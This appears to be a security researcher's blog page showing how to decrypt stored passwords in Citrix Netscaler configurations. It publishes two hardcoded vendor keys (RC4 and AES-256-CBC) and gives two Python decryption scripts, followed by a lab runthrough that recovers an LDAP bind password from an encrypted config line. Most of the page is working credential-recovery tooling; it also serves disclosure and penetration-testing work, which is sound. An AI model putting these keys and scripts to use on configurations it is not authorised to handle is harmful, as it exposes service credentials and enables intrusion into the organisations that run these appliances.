---
layout: page
title: Decrypting values from the Citrix Netscaler config
permalink: /citrix-decrypt/
---

## Netscaler

Netscaler has a hardcoded RC4 encryption key used to encrypt cleartext passwords stored in the config, such as for LDAP. The static encryption key exists in the libnscli90.so library. As of 10.5 this was `2286da6ca015bcd9b7259753c2a5fbc2`. (now updated, see below)

The below python script will decrypt LDAP and similar encrypted values obtained from the config.
````
#!/usr/bin/python
from Crypto.Cipher import ARC4
import sys, binascii

def decrypt(key, hex):
        out_cipher = ARC4.new(key)
        decoded = out_cipher.decrypt(hex)
        return decoded

def main():
        #Key hardcoded into netscaler libnscli90.so
        key = binascii.unhexlify("2286da6ca015bcd9b7259753c2a5fbc2")

        if len(sys.argv) == 2:
            raw_in = sys.argv[1]
            ciphertext = binascii.unhexlify(raw_in)
            print decrypt(key,ciphertext)

main()
````

## Update:

This seems to have changed at some point and now ldap bind passwords are encrypted by default with a new technique (in the running config looks like 
`add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf`)

*If the config line says -kek at the end you'll need to pull key encryption keys off the appliance as well, see [this blog post for a reference on the Netscaler KEK](https://www.ferroquesystems.com/resource/citrix-adc-security-kek-files/) :*


Note the `-encryptmethod ENCMTHD_3` in the config. 

After some quick RE on a 12.0 type i figured out this ENCMTHD_3 is just AES256-CBC with a different key `351CBE38F041320F22D990AD8365889C7DE2FCCCAE5A1A8707E21E4ADCCD4AD9`. Heres the way to decrypt ENCMTHD_3 values (the default).


```
import base64
from Crypto.Cipher import AES
from Crypto import Random
import binascii,sys  


BS = 16
unpad = lambda s : s[:-ord(s[len(s)-1:])]

#thanks  https://stackoverflow.com/a/12525165 for aes snippet
class AESCipher:
    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) ) 

    def decrypt( self, enc ):
        iv = "\x00" * 16
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc ))



def main():
        #New Key hardcoded into netscaler libnscli90.so
        key = binascii.unhexlify("351CBE38F041320F22D990AD8365889C7DE2FCCCAE5A1A8707E21E4ADCCD4AD9")

        if len(sys.argv) == 2:  
            raw_in = sys.argv[1]
            ciphertext = binascii.unhexlify(raw_in)
            f = AESCipher(key)
            decoded= f.decrypt(ciphertext)
            print decoded[16:]


main()

```


Runthrough

```
>add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword test12345678secretldappassword -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf
Done
>show running
..snip..
add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf
..snip..

#python decrypt-new.py b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f

test12345678secretldappassword
```

